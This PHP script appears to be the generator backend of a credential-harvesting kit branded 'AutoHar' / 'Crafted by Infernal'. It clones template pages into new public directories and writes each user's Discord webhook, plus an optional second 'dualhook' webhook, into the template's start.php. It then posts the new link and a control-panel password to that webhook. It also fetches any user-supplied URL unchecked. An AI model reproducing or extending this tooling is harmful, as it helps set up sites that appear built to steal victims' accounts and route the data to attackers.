<?php
include 'config.php';
include 'function.php';

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$tableCheckQuery = "SHOW TABLES LIKE 'data'";
$result = $conn->query($tableCheckQuery);


if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST['web']) && !empty($_POST['web'])) {
        $webValue = $_POST['web'];

        $randomPassword = generateRandomPassword();

        $webhookUrl = $webValue;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $webhookUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);  
        curl_setopt($ch, CURLOPT_NOBODY, true);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
        curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200) {
            echo json_encode(["status" => "error", "message" => "Invalid webhook."]);
            exit;  
        }

        if (isset($_POST['dir']) && !empty($_POST['dir']) && 
            isset($_POST['t']) && !empty($_POST['t'])) {

            $dirName = basename($_POST['dir']);

            if (strlen($dirName) > 25 || strlen($dirName) < 2) {
                echo json_encode(["status" => "error", "message" => "Invalid Directory Name Change."]);
                exit;
            }
            
            if (strlen($dirName) > 25 || strlen($dirName) < 2) {
                echo json_encode(["status" => "error", "message" => "Invalid Directory Name Change."]);
                exit;
            }

            if (!preg_match('/^[a-zA-Z0-9-]+$/', $dirName)) {
            echo json_encode(["status" => "error", "message" => "Invalid Directory Name Change."]);
            exit;
            }


            $type = basename($_POST['t']); 
            
            $basePath = __DIR__ . '/../r/';
            $dhpath = __DIR__ . '/../gen/';
            if ($type == "dh"){
                $fullPath = $dhpath . $dirName;
                $pfad = 'gen';
            }else{
                $fullPath = $basePath . $dirName;
                $pfad = 'r';
            }
            $sourcePath = __DIR__ . "/../apis/tools/$type"; 

            if (file_exists($fullPath)) {
                $existingDirs = array_merge(
                    glob($basePath . '*', GLOB_ONLYDIR),
                    glob($dhpath . '*', GLOB_ONLYDIR)
                );
                
                foreach ($existingDirs as $existingDirPath) {
                    $existingDirName = basename($existingDirPath);
                    if (strcasecmp($existingDirName, $dirName) === 0) {
                        echo json_encode(["status" => "error", "message" => "Directory name already exists."]);
                        exit;
                    }
                }
                
                if (file_exists($fullPath)) {
                    echo json_encode(["status" => "error", "message" => "Directory already exists."]);
                    exit;
                }
            }                
            
            if (isset($_POST['dh'])) {
                $dualhook = $_POST['dh'];
            }

            if(isset($_POST['name'])) {
                $name = $_POST['name'];
                if (strlen($name) > 25 || strlen($name) < 2) {
                    echo json_encode(["status" => "error", "message" => "Too Long Name, Change Please."]);
                    exit;
                }
            }



            if (isset($_POST['thumb'])) {
                $thumbnail = $_POST['thumb'];
                if(isImageUrl($thumbnail)) {
                    $thumbnail = $_POST['thumb'];
                } else {
                    echo json_encode(["status" => "error", "message" => "Invalid Thumbnail URL."]);
                    exit;
                }
            }

            if (isset($_POST['dc'])) {
                $discord = $_POST['dc'];
                $inviteCode = preg_replace('/^(https:\/\/)?(discord\.gg\/|discord\.com\/invite\/)/', '', $discord);
                
                if (!isValidDiscordInvite($inviteCode)) {
                    echo json_encode(["status" => "error", "message" => "Invalid Discord Invite."]);
                    exit;
                }
            }
            

            if (file_exists($sourcePath) && is_dir($sourcePath)) {
                if (mkdir($fullPath, 0777, true)) {
                    if (copyFolder($sourcePath, $fullPath)) {
                        $startPhpPath = "$fullPath/start.php";

                        if (file_exists($startPhpPath)) {
                            $startPhpContent = file_get_contents($startPhpPath);
                            //hook inside gen start.php
                            if($type == "dh"){
                                $startPhpContent = str_replace('{dual}', $webValue, $startPhpContent);
                                $startPhpContent = str_replace('{name}', $name, $startPhpContent);
                                $startPhpContent = str_replace('{thumb}', $thumbnail, $startPhpContent);
                                $startPhpContent = str_replace('{invite}', $discord, $startPhpContent);
                            }
                            //normal inside tools start.php
                            $startPhpContent = str_replace('{a}', $webValue, $startPhpContent);
                            $startPhpContent = str_replace('{h}', $dirName, $startPhpContent);
                            if(isset($_POST['dh'])){
                                $startPhpContent = str_replace('{b}', $dualhook, $startPhpContent);
                                $startPhpContent = str_replace('{d}', $name, $startPhpContent);
                                $startPhpContent = str_replace('{f}', $thumbnail, $startPhpContent);
                                $startPhpContent = str_replace('{e}', $discord, $startPhpContent);
                                $startPhpContent = str_replace('null', 'true', $startPhpContent);

                            }
                        
                            file_put_contents($startPhpPath, $startPhpContent);
                        }

                        //default
                        $summary = 0;
                        $views = 0;
                        $hits = 0;
                        
                        $stmt = $conn->prepare("INSERT INTO data (web, dir, type, password, summary, views, hits) VALUES (?, ?, ?, ?, ?, ?, ?)");
                        $stmt->bind_param("sssssss", $webhookUrl, $dirName, $type, $randomPassword, $summary, $views, $hits);



                        if ($stmt->execute()) {
                            $stmt->close();
                            

                            $domainName = $_SERVER['HTTP_HOST'];

                            $embedData = [
                                "content" => "",
                                "tts" => false,
                                "embeds" => [
                                    [
                                        "fields" => [
                                            [
                                                "name" => "<:Targety:1332708018277580873> Successfully Generated Experience!",
                                                "value" => "[**Direct Link**](https://$domainName/$pfad/$dirName)🏹\n```https://$domainName/$pfad/$dirName```",
                                                "inline" => false
                                            ]
                                        ],
                                        "footer" => [
                                            "text" => "Crafted by Infernal",
                                            "icon_url" => "https://i.ibb.co/TvHB0ZM/image-5.png"
                                        ]
                                    ]
                                ],
                                "username" => "Create AutoHar",
                            ];
                            
                            if (trim($type) !== "dh") {
                                $embedData["embeds"][0]["fields"][] = [
                                    "name" => "",
                                    "value" => "[**Control**](https://$domainName/control/sign-in.php?key=$randomPassword)🔐 ```$randomPassword```",
                                    "inline" => false
                                ];
                            }
                            
                            
                            $jsonEmbed = json_encode($embedData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                            
                            $ch = curl_init($webhookUrl);
                            curl_setopt($ch, CURLOPT_POST, true);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonEmbed);
                            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                                'Content-Type: application/json',
                                'Content-Length: ' . strlen($jsonEmbed)
                            ]);
                            curl_exec($ch);
                            curl_close($ch);

                            echo json_encode(["status" => "success", "message" => "Success! Check your webhook!"]);
                        } else {
                            echo json_encode(["status" => "error", "message" => "Failed to insert data into the database."]);
                        }
                    } else {
                        echo json_encode(["status" => "error", "message" => "Failed to copy folder contents."]);
                    }
                } else {
                    echo json_encode(["status" => "error", "message" => "Failed to create directory."]);
                }
            } else {
                echo json_encode(["status" => "error", "message" => "Source folder does not exist or is not a directory."]);
            }
        } else {
            echo json_encode(["status" => "error", "message" => "Missing required parameters."]);
        }
    } else {
        echo json_encode(["status" => "error", "message" => "Missing webhook parameter."]);
    }
} else {
    echo json_encode(["status" => "error", "message" => "Invalid request method."]);
}

?>